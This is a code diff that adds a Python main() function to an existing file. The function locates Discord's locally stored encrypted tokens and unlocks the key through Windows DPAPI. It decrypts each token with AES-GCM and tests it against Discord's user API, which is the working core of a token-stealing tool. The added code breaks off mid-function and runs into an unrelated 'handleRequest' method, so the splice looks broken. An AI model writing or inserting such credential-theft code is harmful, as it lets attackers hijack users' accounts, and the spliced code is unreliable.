@@ -218,6 +218,27 @@ def gettokens(path):
             continue
 
     return tokens
+    
+def main():
+    checked = []
+
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+
+        for token in gettokens(path):
+            token = token.replace("\\", "") if token.endswith("\\") else token
+
+            try:
+                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
+                if token in checked:
+                    continue
+                checked.append(token)
+
+                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
+                if res.getcode() != 200:
+                    continue
+                res_json = json.loads(res.read().decode())
 
     def handleRequest(self):
         try:
